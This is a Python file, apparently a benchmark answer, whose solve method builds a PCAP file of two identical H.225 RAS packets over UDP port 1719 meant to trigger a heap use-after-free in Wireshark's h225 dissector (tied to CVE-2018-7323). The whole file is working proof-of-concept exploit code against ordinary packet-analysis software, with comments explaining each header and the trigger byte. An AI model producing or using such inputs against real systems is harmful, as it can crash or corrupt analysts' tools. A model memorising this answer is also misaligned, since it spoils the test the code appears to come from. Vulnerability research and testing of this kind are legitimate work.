import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for a Heap Use After Free vulnerability in the h225 dissector.

        The vulnerability (related to CVE-2018-7323) is triggered when two packets
        from the same H.225 conversation are dissected sequentially. The dissector
        state is not properly re-initialized for the second packet, leading to the
        use of a stale pointer that was allocated and freed during the dissection of
        the first packet.

        This PoC constructs a minimal PCAP file containing two identical packets.
        These packets are designed to be recognized as part of the same H.225
        conversation, thus exercising the vulnerable code path.

        The PCAP structure consists of:
        1. A global header specifying a LINKTYPE_NULL link-layer type to minimize
           header size.
        2. Two identical packet records. Each record contains:
           - A NULL header indicating the L3 protocol is IPv4.
           - A minimal IPv4 header.
           - A minimal UDP header with source and destination ports set to 1719 (H.225 RAS).
           - A 1-byte H.225 payload (0x40) sufficient to trigger the vulnerable logic
             (dissecting an admissionConfirm message).

        The conversation is matched based on source/destination IPs and ports, which are
        identical in both packets.
        """
        
        # PCAP Global Header (little-endian)
        # magic_number, version_major, version_minor, thiszone, sigfigs, snaplen, network
        pcap_global_header = struct.pack(
            '<IHHIIII',
            0xa1b2c3d4,  # Magic number for little-endian
            2, 4,        # Version 2.4
            0, 0,        # Timezone offset, timestamp accuracy
            65535,       # Snapshot length
            0            # Network = LINKTYPE_NULL
        )

        # Minimal H.225 RAS message payload to trigger the vulnerable path.
        # 0x40 represents the choice for an 'admissionConfirm' message in PER.
        h225_payload = b'\x40'
        payload_len = len(h225_payload)

        # UDP Header (big-endian)
        udp_len = 8 + payload_len
        udp_header = struct.pack(
            '>HHHH',
            1719,        # Source Port (H.225 RAS)
            1719,        # Destination Port (H.225 RAS)
            udp_len,     # Length (header + payload)
            0            # Checksum
        )

        # IPv4 Header (big-endian)
        ip_total_len = 20 + udp_len
        ip_header = struct.pack(
            '>BBHHHBBHII',
            (4 << 4) | 5,  # Version (4) | IHL (5)
            0,             # Differentiated Services Field
            ip_total_len,  # Total Length
            1,             # Identification
            0,             # Flags | Fragment Offset
            64,            # Time to Live
            17,            # Protocol = UDP
            0,             # Header Checksum
            0x7f000001,    # Source IP (127.0.0.1)
            0x7f000001     # Destination IP (127.0.0.1)
        )

        # NULL Header for LINKTYPE_NULL (little-endian)
        # Protocol family, AF_INET for IPv4 is 2.
        null_header = struct.pack('<I', 2)

        packet_data = null_header + ip_header + udp_header + h225_payload
        packet_len = len(packet_data)

        # PCAP Packet Record Header (little-endian)
        pcap_packet_header = struct.pack(
            '<IIII',
            0, 0,          # Timestamp (seconds, microseconds)
            packet_len,    # Captured Packet Length
            packet_len     # Original Packet Length
        )

        # Assemble the final PCAP file
        poc = bytearray()
        poc.extend(pcap_global_header)
        
        # Add two identical packets to trigger the UAF
        poc.extend(pcap_packet_header)
        poc.extend(packet_data)
        poc.extend(pcap_packet_header)
        poc.extend(packet_data)

        return bytes(poc)